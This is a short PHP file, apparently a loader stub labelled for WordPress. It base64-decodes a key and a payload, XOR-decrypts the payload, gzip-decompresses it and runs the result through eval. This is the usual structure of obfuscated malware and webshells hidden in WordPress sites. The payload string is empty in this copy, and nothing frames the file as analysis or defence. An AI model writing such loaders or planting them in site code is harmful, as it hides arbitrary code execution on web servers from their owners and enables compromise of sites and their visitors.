<?php
/*
  ============================================================
  WORDPRESS BASE64_GZUNCOMPPRES
  ============================================================
*/
$k = base64_decode('Qul4QyRVdOW28xSx+RbaZQ==');
$p = base64_decode('');

function xor_decrypt($data, $key) {
    $len = strlen($key);
    $out = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $out .= $data[$i] ^ $key[$i % $len];
    }
    return $out;
}

// Decrypt
$decrypted = xor_decrypt($p, $k);

// Decompress
$source = gzuncompress($decrypted);
if ($source === false) {
    die("[!] Decryption failed.");
}

// Execute
eval('?>' . $source);